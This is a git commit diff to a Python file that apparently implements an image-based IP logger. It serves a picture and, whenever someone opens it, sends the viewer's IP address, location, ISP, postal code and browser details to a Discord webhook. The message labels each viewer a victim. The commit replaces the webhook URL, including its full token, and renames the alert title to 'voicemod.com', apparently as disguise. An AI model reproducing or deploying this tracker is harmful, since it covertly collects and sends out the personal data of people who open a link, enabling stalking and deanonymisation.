5e190d3db536b4a49064949653a86f78e621e13b
hacker3393 <johhnysins2025@outlook.com>
2025-04-30 21:02:44 -0400

    image.py

--- api/Pixerrift.py
+++ api/Pixerrift.py
@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discord.com/api/webhooks/1367301447292813372/oN4cW9s4d4eqqoiP_Im3MX7SCKkxQmEf53q98gx6HX3ZCaty6Dq8_awSpzxq9jyqu5Ad-'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
@@ -14,7 +14,7 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "voicemod.com",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
